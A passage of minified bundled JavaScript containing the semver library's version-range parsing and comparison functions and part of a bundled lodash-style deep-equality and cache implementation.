      const h = this.map.get(c);
      if (h !== void 0) return this.map.delete(c), this.map.set(c, h), h;
    }
    delete(c) {
      return this.map.delete(c);
    }
    set(c, h) {
      if (!this.delete(c) && h !== void 0) {
        if (this.map.size >= this.max) {
          const t = this.map.keys().next().value;
          this.delete(t);
        }
        this.map.set(c, h);
      }
      return this;
    }
  }
  return (Ui = a), Ui;
}
var ki, nu;
function st() {
  if (nu) return ki;
  nu = 1;
  const a = /\s+/g;
  class i {
    constructor($, k) {
      if (((k = f(k)), $ instanceof i))
        return $.loose === !!k.loose &&
          $.includePrerelease === !!k.includePrerelease
          ? $
          : new i($.raw, k);
      if ($ instanceof t)
        return (
          (this.raw = $.value),
          (this.set = [[$]]),
          (this.formatted = void 0),
          this
        );
      if (
        ((this.options = k),
          (this.loose = !!k.loose),
          (this.includePrerelease = !!k.includePrerelease),
          (this.raw = $.trim().replace(a, " ")),
          (this.set = this.raw
            .split("||")
            .map((M) => this.parseRange(M.trim()))
            .filter((M) => M.length)),
          !this.set.length)
      )
        throw new TypeError(`Invalid SemVer Range: ${this.raw}`);
      if (this.set.length > 1) {
        const M = this.set[0];
        if (
          ((this.set = this.set.filter((K) => !y(K[0]))), this.set.length === 0)
        )
          this.set = [M];
        else if (this.set.length > 1) {
          for (const K of this.set)
            if (K.length === 1 && p(K[0])) {
              this.set = [K];
              break;
            }
        }
      }
      this.formatted = void 0;
    }
    get range() {
      if (this.formatted === void 0) {
        this.formatted = "";
        for (let $ = 0; $ < this.set.length; $++) {
          $ > 0 && (this.formatted += "||");
          const k = this.set[$];
          for (let M = 0; M < k.length; M++)
            M > 0 && (this.formatted += " "),
              (this.formatted += k[M].toString().trim());
        }
      }
      return this.formatted;
    }
    format() {
      return this.range;
    }
    toString() {
      return this.range;
    }
    parseRange($) {
      const M =
        ((this.options.includePrerelease && m) | (this.options.loose && E)) +
        ":" +
        $,
        K = h.get(M);
      if (K) return K;
      const G = this.options.loose,
        ne = G ? e[o.HYPHENRANGELOOSE] : e[o.HYPHENRANGE];
      ($ = $.replace(ne, N(this.options.includePrerelease))),
        r("hyphen replace", $),
        ($ = $.replace(e[o.COMPARATORTRIM], n)),
        r("comparator trim", $),
        ($ = $.replace(e[o.TILDETRIM], s)),
        r("tilde trim", $),
        ($ = $.replace(e[o.CARETTRIM], u)),
        r("caret trim", $);
      let se = $.split(" ")
        .map((J) => S(J, this.options))
        .join(" ")
        .split(/\s+/)
        .map((J) => O(J, this.options));
      G &&
        (se = se.filter(
          (J) => (
            r("loose invalid filter", J, this.options),
            !!J.match(e[o.COMPARATORLOOSE])
          )
        )),
        r("range list", se);
      const ce = new Map(),
        ie = se.map((J) => new t(J, this.options));
      for (const J of ie) {
        if (y(J)) return [J];
        ce.set(J.value, J);
      }
      ce.size > 1 && ce.has("") && ce.delete("");
      const Re = [...ce.values()];
      return h.set(M, Re), Re;
    }
    intersects($, k) {
      if (!($ instanceof i)) throw new TypeError("a Range is required");
      return this.set.some(
        (M) =>
          A(M, k) &&
          $.set.some(
            (K) =>
              A(K, k) && M.every((G) => K.every((ne) => G.intersects(ne, k)))
          )
      );
    }
    test($) {
      if (!$) return !1;
      if (typeof $ == "string")
        try {
          $ = new l($, this.options);
        } catch {
          return !1;
        }
      for (let k = 0; k < this.set.length; k++)
        if (L(this.set[k], $, this.options)) return !0;
      return !1;
    }
  }
  ki = i;
  const c = rd(),
    h = new c(),
    f = No(),
    t = Jr(),
    r = Kr(),
    l = Ye(),
    {
      safeRe: e,
      t: o,
      comparatorTrimReplace: n,
      tildeTrimReplace: s,
      caretTrimReplace: u,
    } = br(),
    { FLAG_INCLUDE_PRERELEASE: m, FLAG_LOOSE: E } = Yr(),
    y = (F) => F.value === "<0.0.0-0",
    p = (F) => F.value === "",
    A = (F, $) => {
      let k = !0;
      const M = F.slice();
      let K = M.pop();
      for (; k && M.length;)
        (k = M.every((G) => K.intersects(G, $))), (K = M.pop());
      return k;
    },
    S = (F, $) => (
      r("comp", F, $),
      (F = v(F, $)),
      r("caret", F),
      (F = R(F, $)),
      r("tildes", F),
      (F = _(F, $)),
      r("xrange", F),
      (F = D(F, $)),
      r("stars", F),
      F
    ),
    b = (F) => !F || F.toLowerCase() === "x" || F === "*",
    R = (F, $) =>
      F.trim()
        .split(/\s+/)
        .map((k) => C(k, $))
        .join(" "),
    C = (F, $) => {
      const k = $.loose ? e[o.TILDELOOSE] : e[o.TILDE];
      return F.replace(k, (M, K, G, ne, se) => {
        r("tilde", F, M, K, G, ne, se);
        let ce;
        return (
          b(K)
            ? (ce = "")
            : b(G)
              ? (ce = `>=${K}.0.0 <${+K + 1}.0.0-0`)
              : b(ne)
                ? (ce = `>=${K}.${G}.0 <${K}.${+G + 1}.0-0`)
                : se
                  ? (r("replaceTilde pr", se),
                    (ce = `>=${K}.${G}.${ne}-${se} <${K}.${+G + 1}.0-0`))
                  : (ce = `>=${K}.${G}.${ne} <${K}.${+G + 1}.0-0`),
          r("tilde return", ce),
          ce
        );
      });
    },
    v = (F, $) =>
      F.trim()
        .split(/\s+/)
        .map((k) => w(k, $))
        .join(" "),
    w = (F, $) => {
      r("caret", F, $);
      const k = $.loose ? e[o.CARETLOOSE] : e[o.CARET],
        M = $.includePrerelease ? "-0" : "";
      return F.replace(k, (K, G, ne, se, ce) => {
        r("caret", F, K, G, ne, se, ce);
        let ie;
        return (
          b(G)
            ? (ie = "")
            : b(ne)
              ? (ie = `>=${G}.0.0${M} <${+G + 1}.0.0-0`)
              : b(se)
                ? G === "0"
                  ? (ie = `>=${G}.${ne}.0${M} <${G}.${+ne + 1}.0-0`)
                  : (ie = `>=${G}.${ne}.0${M} <${+G + 1}.0.0-0`)
                : ce
                  ? (r("replaceCaret pr", ce),
                    G === "0"
                      ? ne === "0"
                        ? (ie = `>=${G}.${ne}.${se}-${ce} <${G}.${ne}.${+se + 1}-0`)
                        : (ie = `>=${G}.${ne}.${se}-${ce} <${G}.${+ne + 1}.0-0`)
                      : (ie = `>=${G}.${ne}.${se}-${ce} <${+G + 1}.0.0-0`))
                  : (r("no pr"),
                    G === "0"
                      ? ne === "0"
                        ? (ie = `>=${G}.${ne}.${se}${M} <${G}.${ne}.${+se + 1}-0`)
                        : (ie = `>=${G}.${ne}.${se}${M} <${G}.${+ne + 1}.0-0`)
                      : (ie = `>=${G}.${ne}.${se} <${+G + 1}.0.0-0`)),
          r("caret return", ie),
          ie
        );
      });
    },
    _ = (F, $) => (
      r("replaceXRanges", F, $),
      F.split(/\s+/)
        .map((k) => g(k, $))
        .join(" ")
    ),
    g = (F, $) => {
      F = F.trim();
      const k = $.loose ? e[o.XRANGELOOSE] : e[o.XRANGE];
      return F.replace(k, (M, K, G, ne, se, ce) => {
        r("xRange", F, M, K, G, ne, se, ce);
        const ie = b(G),
          Re = ie || b(ne),
          J = Re || b(se),
          Ee = J;
        return (
          K === "=" && Ee && (K = ""),
          (ce = $.includePrerelease ? "-0" : ""),
          ie
            ? K === ">" || K === "<"
              ? (M = "<0.0.0-0")
              : (M = "*")
            : K && Ee
              ? (Re && (ne = 0),
                (se = 0),
                K === ">"
                  ? ((K = ">="),
                    Re
                      ? ((G = +G + 1), (ne = 0), (se = 0))
                      : ((ne = +ne + 1), (se = 0)))
                  : K === "<=" && ((K = "<"), Re ? (G = +G + 1) : (ne = +ne + 1)),
                K === "<" && (ce = "-0"),
                (M = `${K + G}.${ne}.${se}${ce}`))
              : Re
                ? (M = `>=${G}.0.0${ce} <${+G + 1}.0.0-0`)
                : J && (M = `>=${G}.${ne}.0${ce} <${G}.${+ne + 1}.0-0`),
          r("xRange return", M),
          M
        );
      });
    },
    D = (F, $) => (r("replaceStars", F, $), F.trim().replace(e[o.STAR], "")),
    O = (F, $) => (
      r("replaceGTE0", F, $),
      F.trim().replace(e[$.includePrerelease ? o.GTE0PRE : o.GTE0], "")
    ),
    N = (F) => ($, k, M, K, G, ne, se, ce, ie, Re, J, Ee) => (
      b(M)
        ? (k = "")
        : b(K)
          ? (k = `>=${M}.0.0${F ? "-0" : ""}`)
          : b(G)
            ? (k = `>=${M}.${K}.0${F ? "-0" : ""}`)
            : ne
              ? (k = `>=${k}`)
              : (k = `>=${k}${F ? "-0" : ""}`),
      b(ie)
        ? (ce = "")
        : b(Re)
          ? (ce = `<${+ie + 1}.0.0-0`)
          : b(J)
            ? (ce = `<${ie}.${+Re + 1}.0-0`)
            : Ee
              ? (ce = `<=${ie}.${Re}.${J}-${Ee}`)
              : F
                ? (ce = `<${ie}.${Re}.${+J + 1}-0`)
                : (ce = `<=${ce}`),
      `${k} ${ce}`.trim()
    ),
    L = (F, $, k) => {
      for (let M = 0; M < F.length; M++) if (!F[M].test($)) return !1;
      if ($.prerelease.length && !k.includePrerelease) {
        for (let M = 0; M < F.length; M++)
          if (
            (r(F[M].semver),
              F[M].semver !== t.ANY && F[M].semver.prerelease.length > 0)
          ) {
            const K = F[M].semver;
            if (
              K.major === $.major &&
              K.minor === $.minor &&
              K.patch === $.patch
            )
              return !0;
          }
        return !1;
      }
      return !0;
    };
  return ki;
}
var qi, iu;
function Jr() {
  if (iu) return qi;
  iu = 1;
  const a = Symbol("SemVer ANY");
  class i {
    static get ANY() {
      return a;
    }
    constructor(n, s) {
      if (((s = c(s)), n instanceof i)) {
        if (n.loose === !!s.loose) return n;
        n = n.value;
      }
      (n = n.trim().split(/\s+/).join(" ")),
        r("comparator", n, s),
        (this.options = s),
        (this.loose = !!s.loose),
        this.parse(n),
        this.semver === a
          ? (this.value = "")
          : (this.value = this.operator + this.semver.version),
        r("comp", this);
    }
    parse(n) {
      const s = this.options.loose ? h[f.COMPARATORLOOSE] : h[f.COMPARATOR],
        u = n.match(s);
      if (!u) throw new TypeError(`Invalid comparator: ${n}`);
      (this.operator = u[1] !== void 0 ? u[1] : ""),
        this.operator === "=" && (this.operator = ""),
        u[2]
          ? (this.semver = new l(u[2], this.options.loose))
          : (this.semver = a);
    }
    toString() {
      return this.value;
    }
    test(n) {
      if (
        (r("Comparator.test", n, this.options.loose),
          this.semver === a || n === a)
      )
        return !0;
      if (typeof n == "string")
        try {
          n = new l(n, this.options);
        } catch {
          return !1;
        }
      return t(n, this.operator, this.semver, this.options);
    }
    intersects(n, s) {
      if (!(n instanceof i)) throw new TypeError("a Comparator is required");
      return this.operator === ""
        ? this.value === ""
          ? !0
          : new e(n.value, s).test(this.value)
        : n.operator === ""
          ? n.value === ""
            ? !0
            : new e(this.value, s).test(n.semver)
          : ((s = c(s)),
            (s.includePrerelease &&
              (this.value === "<0.0.0-0" || n.value === "<0.0.0-0")) ||
              (!s.includePrerelease &&
                (this.value.startsWith("<0.0.0") || n.value.startsWith("<0.0.0")))
              ? !1
              : !!(
                (this.operator.startsWith(">") && n.operator.startsWith(">")) ||
                (this.operator.startsWith("<") && n.operator.startsWith("<")) ||
                (this.semver.version === n.semver.version &&
                  this.operator.includes("=") &&
                  n.operator.includes("=")) ||
                (t(this.semver, "<", n.semver, s) &&
                  this.operator.startsWith(">") &&
                  n.operator.startsWith("<")) ||
                (t(this.semver, ">", n.semver, s) &&
                  this.operator.startsWith("<") &&
                  n.operator.startsWith(">"))
              ));
    }
  }
  qi = i;
  const c = No(),
    { safeRe: h, t: f } = br(),
    t = Yl(),
    r = Kr(),
    l = Ye(),
    e = st();
  return qi;
}
var Mi, ou;
function Qr() {
  if (ou) return Mi;
  ou = 1;
  const a = st();
  return (
    (Mi = (c, h, f) => {
      try {
        h = new a(h, f);
      } catch {
        return !1;
      }
      return h.test(c);
    }),
    Mi
  );
}
var Bi, au;
function nd() {
  if (au) return Bi;
  au = 1;
  const a = st();
  return (
    (Bi = (c, h) =>
      new a(c, h).set.map((f) =>
        f
          .map((t) => t.value)
          .join(" ")
          .trim()
          .split(" ")
      )),
    Bi
  );
}
var ji, su;
function id() {
  if (su) return ji;
  su = 1;
  const a = Ye(),
    i = st();
  return (
    (ji = (h, f, t) => {
      let r = null,
        l = null,
        e = null;
      try {
        e = new i(f, t);
      } catch {
        return null;
      }
      return (
        h.forEach((o) => {
          e.test(o) &&
            (!r || l.compare(o) === -1) &&
            ((r = o), (l = new a(r, t)));
        }),
        r
      );
    }),
    ji
  );
}
var Hi, uu;
function od() {
  if (uu) return Hi;
  uu = 1;
  const a = Ye(),
    i = st();
  return (
    (Hi = (h, f, t) => {
      let r = null,
        l = null,
        e = null;
      try {
        e = new i(f, t);
      } catch {
        return null;
      }
      return (
        h.forEach((o) => {
          e.test(o) &&
            (!r || l.compare(o) === 1) &&
            ((r = o), (l = new a(r, t)));
        }),
        r
      );
    }),
    Hi
  );
}
var Gi, lu;
function ad() {
  if (lu) return Gi;
  lu = 1;
  const a = Ye(),
    i = st(),
    c = Xr();
  return (
    (Gi = (f, t) => {
      f = new i(f, t);
      let r = new a("0.0.0");
      if (f.test(r) || ((r = new a("0.0.0-0")), f.test(r))) return r;
      r = null;
      for (let l = 0; l < f.set.length; ++l) {
        const e = f.set[l];
        let o = null;
        e.forEach((n) => {
          const s = new a(n.semver.version);
          switch (n.operator) {
            case ">":
              s.prerelease.length === 0 ? s.patch++ : s.prerelease.push(0),
                (s.raw = s.format());
            case "":
            case ">=":
              (!o || c(s, o)) && (o = s);
              break;
            case "<":
            case "<=":
              break;
            default:
              throw new Error(`Unexpected operation: ${n.operator}`);
          }
        }),
          o && (!r || c(r, o)) && (r = o);
      }
      return r && f.test(r) ? r : null;
    }),
    Gi
  );
}
var Vi, cu;
function sd() {
  if (cu) return Vi;
  cu = 1;
  const a = st();
  return (
    (Vi = (c, h) => {
      try {
        return new a(c, h).range || "*";
      } catch {
        return null;
      }
    }),
    Vi
  );
}
var Wi, fu;
function ko() {
  if (fu) return Wi;
  fu = 1;
  const a = Ye(),
    i = Jr(),
    { ANY: c } = i,
    h = st(),
    f = Qr(),
    t = Xr(),
    r = $o(),
    l = Uo(),
    e = Lo();
  return (
    (Wi = (n, s, u, m) => {
      (n = new a(n, m)), (s = new h(s, m));
      let E, y, p, A, S;
      switch (u) {
        case ">":
          (E = t), (y = l), (p = r), (A = ">"), (S = ">=");
          break;
        case "<":
          (E = r), (y = e), (p = t), (A = "<"), (S = "<=");
          break;
        default:
          throw new TypeError('Must provide a hilo val of "<" or ">"');
      }
      if (f(n, s, m)) return !1;
      for (let b = 0; b < s.set.length; ++b) {
        const R = s.set[b];
        let C = null,
          v = null;
        if (
          (R.forEach((w) => {
            w.semver === c && (w = new i(">=0.0.0")),
              (C = C || w),
              (v = v || w),
              E(w.semver, C.semver, m)
                ? (C = w)
                : p(w.semver, v.semver, m) && (v = w);
          }),
            C.operator === A ||
            C.operator === S ||
            ((!v.operator || v.operator === A) && y(n, v.semver)))
        )
          return !1;
        if (v.operator === S && p(n, v.semver)) return !1;
      }
      return !0;
    }),
    Wi
  );
}
var zi, du;
function ud() {
  if (du) return zi;
  du = 1;
  const a = ko();
  return (zi = (c, h, f) => a(c, h, ">", f)), zi;
}
var Yi, hu;
function ld() {
  if (hu) return Yi;
  hu = 1;
  const a = ko();
  return (Yi = (c, h, f) => a(c, h, "<", f)), Yi;
}
var Ki, pu;
function cd() {
  if (pu) return Ki;
  pu = 1;
  const a = st();
  return (
    (Ki = (c, h, f) => (
      (c = new a(c, f)), (h = new a(h, f)), c.intersects(h, f)
    )),
    Ki
  );
}
var Xi, mu;
function fd() {
  if (mu) return Xi;
  mu = 1;
  const a = Qr(),
    i = at();
  return (
    (Xi = (c, h, f) => {
      const t = [];
      let r = null,
        l = null;
      const e = c.sort((u, m) => i(u, m, f));
      for (const u of e)
        a(u, h, f)
          ? ((l = u), r || (r = u))
          : (l && t.push([r, l]), (l = null), (r = null));
      r && t.push([r, null]);
      const o = [];
      for (const [u, m] of t)
        u === m
          ? o.push(u)
          : !m && u === e[0]
            ? o.push("*")
            : m
              ? u === e[0]
                ? o.push(`<=${m}`)
                : o.push(`${u} - ${m}`)
              : o.push(`>=${u}`);
      const n = o.join(" || "),
        s = typeof h.raw == "string" ? h.raw : String(h);
      return n.length < s.length ? n : h;
    }),
    Xi
  );
}
var Ji, gu;
function dd() {
  if (gu) return Ji;
  gu = 1;
  const a = st(),
    i = Jr(),
    { ANY: c } = i,
    h = Qr(),
    f = at(),
    t = (s, u, m = {}) => {
      if (s === u) return !0;
      (s = new a(s, m)), (u = new a(u, m));
      let E = !1;
      e: for (const y of s.set) {
        for (const p of u.set) {
          const A = e(y, p, m);
          if (((E = E || A !== null), A)) continue e;
        }
        if (E) return !1;
      }
      return !0;
    },
    r = [new i(">=0.0.0-0")],
    l = [new i(">=0.0.0")],
    e = (s, u, m) => {
      if (s === u) return !0;
      if (s.length === 1 && s[0].semver === c) {
        if (u.length === 1 && u[0].semver === c) return !0;
        m.includePrerelease ? (s = r) : (s = l);
      }
      if (u.length === 1 && u[0].semver === c) {
        if (m.includePrerelease) return !0;
        u = l;
      }
      const E = new Set();
      let y, p;
      for (const _ of s)
        _.operator === ">" || _.operator === ">="
          ? (y = o(y, _, m))
          : _.operator === "<" || _.operator === "<="
            ? (p = n(p, _, m))
            : E.add(_.semver);
      if (E.size > 1) return null;
      let A;
      if (y && p) {
        if (((A = f(y.semver, p.semver, m)), A > 0)) return null;
        if (A === 0 && (y.operator !== ">=" || p.operator !== "<="))
          return null;
      }
      for (const _ of E) {
        if ((y && !h(_, String(y), m)) || (p && !h(_, String(p), m)))
          return null;
        for (const g of u) if (!h(_, String(g), m)) return !1;
        return !0;
      }
      let S,
        b,
        R,
        C,
        v =
          p && !m.includePrerelease && p.semver.prerelease.length
            ? p.semver
            : !1,
        w =
          y && !m.includePrerelease && y.semver.prerelease.length
            ? y.semver
            : !1;
      v &&
        v.prerelease.length === 1 &&
        p.operator === "<" &&
        v.prerelease[0] === 0 &&
        (v = !1);
      for (const _ of u) {
        if (
          ((C = C || _.operator === ">" || _.operator === ">="),
            (R = R || _.operator === "<" || _.operator === "<="),
            y)
        ) {
          if (
            (w &&
              _.semver.prerelease &&
              _.semver.prerelease.length &&
              _.semver.major === w.major &&
              _.semver.minor === w.minor &&
              _.semver.patch === w.patch &&
              (w = !1),
              _.operator === ">" || _.operator === ">=")
          ) {
            if (((S = o(y, _, m)), S === _ && S !== y)) return !1;
          } else if (y.operator === ">=" && !h(y.semver, String(_), m))
            return !1;
        }
        if (p) {
          if (
            (v &&
              _.semver.prerelease &&
              _.semver.prerelease.length &&
              _.semver.major === v.major &&
              _.semver.minor === v.minor &&
              _.semver.patch === v.patch &&
              (v = !1),
              _.operator === "<" || _.operator === "<=")
          ) {
            if (((b = n(p, _, m)), b === _ && b !== p)) return !1;
          } else if (p.operator === "<=" && !h(p.semver, String(_), m))
            return !1;
        }
        if (!_.operator && (p || y) && A !== 0) return !1;
      }
      return !(
        (y && R && !p && A !== 0) ||
        (p && C && !y && A !== 0) ||
        w ||
        v
      );
    },
    o = (s, u, m) => {
      if (!s) return u;
      const E = f(s.semver, u.semver, m);
      return E > 0
        ? s
        : E < 0 || (u.operator === ">" && s.operator === ">=")
          ? u
          : s;
    },
    n = (s, u, m) => {
      if (!s) return u;
      const E = f(s.semver, u.semver, m);
      return E < 0
        ? s
        : E > 0 || (u.operator === "<" && s.operator === "<=")
          ? u
          : s;
    };
  return (Ji = t), Ji;
}
var Qi, vu;
function Kl() {
  if (vu) return Qi;
  vu = 1;
  const a = br(),
    i = Yr(),
    c = Ye(),
    h = Vl(),
    f = zt(),
    t = Hf(),
    r = Gf(),
    l = Vf(),
    e = Wf(),
    o = zf(),
    n = Yf(),
    s = Kf(),
    u = Xf(),
    m = at(),
    E = Jf(),
    y = Qf(),
    p = Fo(),
    A = Zf(),
    S = ed(),
    b = Xr(),
    R = $o(),
    C = Wl(),
    v = zl(),
    w = Lo(),
    _ = Uo(),
    g = Yl(),
    D = td(),
    O = Jr(),
    N = st(),
    L = Qr(),
    F = nd(),
    $ = id(),
    k = od(),
    M = ad(),
    K = sd(),
    G = ko(),
    ne = ud(),
    se = ld(),
    ce = cd(),
    ie = fd(),
    Re = dd();
  return (
    (Qi = {
      parse: f,
      valid: t,
      clean: r,
      inc: l,
      diff: e,
      major: o,
      minor: n,
      patch: s,
      prerelease: u,
      compare: m,
      rcompare: E,
      compareLoose: y,
      compareBuild: p,
      sort: A,
      rsort: S,
      gt: b,
      lt: R,
      eq: C,
      neq: v,
      gte: w,
      lte: _,
      cmp: g,
      coerce: D,
      Comparator: O,
      Range: N,
      satisfies: L,
      toComparators: F,
      maxSatisfying: $,
      minSatisfying: k,
      minVersion: M,
      validRange: K,
      outside: G,
      gtr: ne,
      ltr: se,
      intersects: ce,
      simplifyRange: ie,
      subset: Re,
      SemVer: c,
      re: a.re,
      src: a.src,
      tokens: a.t,
      SEMVER_SPEC_VERSION: i.SEMVER_SPEC_VERSION,
      RELEASE_TYPES: i.RELEASE_TYPES,
      compareIdentifiers: h.compareIdentifiers,
      rcompareIdentifiers: h.rcompareIdentifiers,
    }),
    Qi
  );
}
var Mt = {},
  Er = { exports: {} };
Er.exports;
var wu;
function hd() {
  return (
    wu ||
    ((wu = 1),
      (function (a, i) {
        var c = 200,
          h = "__lodash_hash_undefined__",
          f = 1,
          t = 2,
          r = 9007199254740991,
          l = "[object Arguments]",
          e = "[object Array]",
          o = "[object AsyncFunction]",
          n = "[object Boolean]",
          s = "[object Date]",
          u = "[object Error]",
          m = "[object Function]",
          E = "[object GeneratorFunction]",
          y = "[object Map]",
          p = "[object Number]",
          A = "[object Null]",
          S = "[object Object]",
          b = "[object Promise]",
          R = "[object Proxy]",
          C = "[object RegExp]",
          v = "[object Set]",
          w = "[object String]",
          _ = "[object Symbol]",
          g = "[object Undefined]",
          D = "[object WeakMap]",
          O = "[object ArrayBuffer]",
          N = "[object DataView]",
          L = "[object Float32Array]",
          F = "[object Float64Array]",
          $ = "[object Int8Array]",
          k = "[object Int16Array]",
          M = "[object Int32Array]",
          K = "[object Uint8Array]",
          G = "[object Uint8ClampedArray]",
          ne = "[object Uint16Array]",
          se = "[object Uint32Array]",
          ce = /[\\^$.*+?()[\]{}|]/g,
          ie = /^\[object .+?Constructor\]$/,
          Re = /^(?:0|[1-9]\d*)$/,
          J = {};
        (J[L] = J[F] = J[$] = J[k] = J[M] = J[K] = J[G] = J[ne] = J[se] = !0),
          (J[l] =
            J[e] =
            J[O] =
            J[n] =
            J[N] =
            J[s] =
            J[u] =
            J[m] =
            J[y] =
            J[p] =
            J[S] =
            J[C] =
            J[v] =
            J[w] =
            J[D] =
            !1);
        var Ee = typeof rt == "object" && rt && rt.Object === Object && rt,
          I = typeof self == "object" && self && self.Object === Object && self,
          T = Ee || I || Function("return this")(),
          j = i && !i.nodeType && i,
          U = j && !0 && a && !a.nodeType && a,
          le = U && U.exports === j,
          ge = le && Ee.process,
          me = (function () {
            try {
              return ge && ge.binding && ge.binding("util");
            } catch { }
          })(),
          Se = me && me.isTypedArray;
        function _e(x, q) {
          for (
            var Y = -1, ue = x == null ? 0 : x.length, De = 0, Te = [];
            ++Y < ue;

          ) {
            var Fe = x[Y];
            q(Fe, Y, x) && (Te[De++] = Fe);
          }
          return Te;
        }
        function Le(x, q) {
          for (var Y = -1, ue = q.length, De = x.length; ++Y < ue;)
            x[De + Y] = q[Y];
          return x;
        }
        function Ie(x, q) {
          for (var Y = -1, ue = x == null ? 0 : x.length; ++Y < ue;)
            if (q(x[Y], Y, x)) return !0;
          return !1;
        }
        function je(x, q) {
          for (var Y = -1, ue = Array(x); ++Y < x;) ue[Y] = q(Y);
          return ue;
        }
        function _t(x) {
          return function (q) {
            return x(q);
          };
        }
        function ct(x, q) {
          return x.has(q);
        }
        function d(x, q) {
          return x?.[q];
        }
        function B(x) {
          var q = -1,
            Y = Array(x.size);
          return (
            x.forEach(function (ue, De) {
              Y[++q] = [De, ue];
            }),
            Y
          );
        }
        function V(x, q) {
          return function (Y) {
            return x(q(Y));
          };
        }
        function re(x) {
          var q = -1,
            Y = Array(x.size);
          return (
            x.forEach(function (ue) {
              Y[++q] = ue;
            }),
            Y
          );
        }
        var W = Array.prototype,
          te = Function.prototype,
          Z = Object.prototype,
          oe = T["__core-js_shared__"],
          ve = te.toString,
          we = Z.hasOwnProperty,
          Pe = (function () {
            var x = /[^.]+$/.exec((oe && oe.keys && oe.keys.IE_PROTO) || "");
            return x ? "Symbol(src)_1." + x : "";
          })(),
          de = Z.toString,
          Ue = RegExp(
            "^" +
            ve
              .call(we)
              .replace(ce, "\\$&")
              .replace(
                /hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,
                "$1.*?"
              ) +
            "$"
          ),
          P = le ? T.Buffer : void 0,
          H = T.Symbol,
          X = T.Uint8Array,
          z = Z.propertyIsEnumerable,
          Q = W.splice,
          ee = H ? H.toStringTag : void 0,
          fe = Object.getOwnPropertySymbols,
          ae = P ? P.isBuffer : void 0,
          pe = V(Object.keys, Object),
          Ae = kt(T, "DataView"),
          Oe = kt(T, "Map"),
          Ne = kt(T, "Promise"),
          Ce = kt(T, "Set"),
          Ut = kt(T, "WeakMap"),
          it = kt(Object, "create"),
          At = bt(Ae),
          ic = bt(Oe),
          oc = bt(Ne),
          ac = bt(Ce),
          sc = bt(Ut),
          Go = H ? H.prototype : void 0,
          en = Go ? Go.valueOf : void 0;
        function St(x) {
          var q = -1,
            Y = x == null ? 0 : x.length;
          for (this.clear(); ++q < Y;) {
            var ue = x[q];
            this.set(ue[0], ue[1]);
          }
        }
        function uc() {
          (this.__data__ = it ? it(null) : {}), (this.size = 0);
        }
        function lc(x) {
          var q = this.has(x) && delete this.__data__[x];
          return (this.size -= q ? 1 : 0), q;
        }
        function cc(x) {
          var q = this.__data__;
          if (it) {
            var Y = q[x];
            return Y === h ? void 0 : Y;
          }
          return we.call(q, x) ? q[x] : void 0;
        }
        function fc(x) {
          var q = this.__data__;
          return it ? q[x] !== void 0 : we.call(q, x);
        }
        function dc(x, q) {
          var Y = this.__data__;
          return (
            (this.size += this.has(x) ? 0 : 1),
            (Y[x] = it && q === void 0 ? h : q),
            this
          );
        }
        (St.prototype.clear = uc),
          (St.prototype.delete = lc),
          (St.prototype.get = cc),
          (St.prototype.has = fc),
          (St.prototype.set = dc);
        function ft(x) {
          var q = -1,
            Y = x == null ? 0 : x.length;
          for (this.clear(); ++q < Y;) {
            var ue = x[q];
            this.set(ue[0], ue[1]);
          }
        }
        function hc() {
          (this.__data__ = []), (this.size = 0);
        }
        function pc(x) {
          var q = this.__data__,
            Y = Pr(q, x);
          if (Y < 0) return !1;
          var ue = q.length - 1;
          return Y == ue ? q.pop() : Q.call(q, Y, 1), --this.size, !0;
        }
        function mc(x) {
          var q = this.__data__,
            Y = Pr(q, x);
          return Y < 0 ? void 0 : q[Y][1];
        }
        function gc(x) {
          return Pr(this.__data__, x) > -1;
        }
        function vc(x, q) {
          var Y = this.__data__,
            ue = Pr(Y, x);
          return ue < 0 ? (++this.size, Y.push([x, q])) : (Y[ue][1] = q), this;
        }
        (ft.prototype.clear = hc),
          (ft.prototype.delete = pc),
          (ft.prototype.get = mc),
          (ft.prototype.has = gc),
          (ft.prototype.set = vc);
        function Tt(x) {
          var q = -1,
            Y = x == null ? 0 : x.length;
          for (this.clear(); ++q < Y;) {
            var ue = x[q];
            this.set(ue[0], ue[1]);
          }
        }
        function wc() {
          (this.size = 0),
            (this.__data__ = {
              hash: new St(),
              map: new (Oe || ft)(),
              string: new St(),
            });
        }
        function yc(x) {
          var q = Cr(this, x).delete(x);
          return (this.size -= q ? 1 : 0), q;
        }
        function Ec(x) {
          return Cr(this, x).get(x);
        }
        function _c(x) {
          return Cr(this, x).has(x);
        }
        function Ac(x, q) {
          var Y = Cr(this, x),
            ue = Y.size;
          return Y.set(x, q), (this.size += Y.size == ue ? 0 : 1), this;
        }
        (Tt.prototype.clear = wc),
          (Tt.prototype.delete = yc),
          (Tt.prototype.get = Ec),
          (Tt.prototype.has = _c),
          (Tt.prototype.set = Ac);
        function Rr(x) {
          var q = -1,
            Y = x == null ? 0 : x.length;
          for (this.__data__ = new Tt(); ++q < Y;) this.add(x[q]);
        }
        function Sc(x) {
          return this.__data__.set(x, h), this;
        }
        function Tc(x) {
          return this.__data__.has(x);
        }
        (Rr.prototype.add = Rr.prototype.push = Sc), (Rr.prototype.has = Tc);
        function mt(x) {
          var q = (this.__data__ = new ft(x));
          this.size = q.size;
        }
        function bc() {
          (this.__data__ = new ft()), (this.size = 0);
        }
        function Rc(x) {
          var q = this.__data__,
            Y = q.delete(x);
          return (this.size = q.size), Y;
        }
        function Pc(x) {
          return this.__data__.get(x);
        }
        function Cc(x) {
          return this.__data__.has(x);
        }
        function Ic(x, q) {
          var Y = this.__data__;
          if (Y instanceof ft) {
            var ue = Y.__data__;
            if (!Oe || ue.length < c - 1)
              return ue.push([x, q]), (this.size = ++Y.size), this;
            Y = this.__data__ = new Tt(ue);
          }
          return Y.set(x, q), (this.size = Y.size), this;
        }
        (mt.prototype.clear = bc),
          (mt.prototype.delete = Rc),
          (mt.prototype.get = Pc),
          (mt.prototype.has = Cc),
          (mt.prototype.set = Ic);
        function Oc(x, q) {
          var Y = Ir(x),
            ue = !Y && Vc(x),
            De = !Y && !ue && tn(x),
            Te = !Y && !ue && !De && Zo(x),
            Fe = Y || ue || De || Te,
            ke = Fe ? je(x.length, String) : [],
            Me = ke.length;
          for (var xe in x)
            we.call(x, xe) &&
              !(
                Fe &&
                (xe == "length" ||
                  (De && (xe == "offset" || xe == "parent")) ||
                  (Te &&
                    (xe == "buffer" ||
                      xe == "byteLength" ||
                      xe == "byteOffset")) ||
                  Mc(xe, Me))
              ) &&
              ke.push(xe);
          return ke;
        }
        function Pr(x, q) {
          for (var Y = x.length; Y--;) if (Ko(x[Y][0], q)) return Y;
          return -1;
        }
